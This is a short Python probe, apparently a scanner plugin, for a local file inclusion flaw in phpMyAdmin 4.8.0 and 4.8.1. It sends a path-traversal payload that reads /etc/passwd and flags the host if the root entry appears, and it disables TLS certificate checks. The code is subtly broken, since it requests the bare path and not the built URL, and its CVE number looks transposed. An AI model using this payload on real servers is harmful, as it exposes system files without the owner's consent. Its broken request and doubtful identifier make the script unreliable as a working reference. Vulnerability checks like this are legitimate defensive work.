# -*- coding:utf-8 -*-

import ssl
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

ssl._create_default_https_context = ssl._create_unverified_context

def verify(protocol,ip,port):
    url = protocol + '://' + ip + ':' + str(port)
    print('testing if phpmyadmin 4.8.0 and  4.8.1 remote file including vul(cve-2018-12631)')
    try:
        vulpath = '/index.php?target=db_sql.php?/../../../../../../../../etc/passwd'
        vulurl = url + vulpath
        html = requests.get(vulpath, verify=False, timeout=5).text
        if 'root:x:0:0' in html:
            msg = 'There is a phpmyadmin 4.8.0 and  4.8.1 remote file including vul(cve-2018-12631) on %s' % vulurl
            print(msg)
            number = 'v104'
            return True, url, number, msg
        else:
            pass
    except Exception as e:
        msg = str(e)
        number = 'v0'
        return False, url, number, msg
    msg = 'There is no phpmyadmin 4.8.0 and  4.8.1 remote file including vul(cve-2018-12631)'
    number = 'v0'
    return False, url, number, msg